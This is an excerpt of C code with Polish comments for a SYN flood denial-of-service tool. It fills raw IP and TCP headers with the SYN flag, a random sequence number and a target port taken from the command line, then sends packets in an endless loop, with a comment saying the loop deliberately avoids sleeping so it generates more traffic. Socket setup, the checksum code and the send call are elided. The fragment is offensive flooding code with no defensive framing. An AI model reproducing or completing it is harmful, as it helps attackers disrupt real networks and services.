...
int main(int argc, char** argv) {
    ...
    ip_header->ip_sum = 0; // Suma kontrolna IP jest często wypełniana przez jądro, nawet przy IP_HDRINCL

    // Wypełnienie nagłówka TCP dla SYN flood
    tcp_header->th_sport = htons(SOURCE_PORT);
    tcp_header->th_dport = htons(atoi(argv[2]));
    tcp_header->th_seq = htonl(rand() % 4294967295);
    tcp_header->th_ack = 0;
    tcp_header->th_off = 5; // Minimalny rozmiar nagłówka TCP (5 * 4 = 20 bajtów)
    tcp_header->th_flags = TH_SYN; // Ustaw flagę SYN
    tcp_header->th_win = htons(65535); // Maksymalny rozmiar okna
    tcp_header->th_sum = 0; // Suma kontrolna TCP będzie obliczona później
    tcp_header->th_urp = 0;

    // Wypełnienie pseudo-nagłówka dla obliczenia sumy kontrolnej TCP
    ...
    // Alokacja pamięci dla pseudo-pakietu
    ...
    // Obliczenie sumy kontrolnej TCP
    ...
    while (1) {
        ...
        // Nie usypiamy zbyt długo w SYN floodzie, aby generować ruch
        // sleep(1);
    }
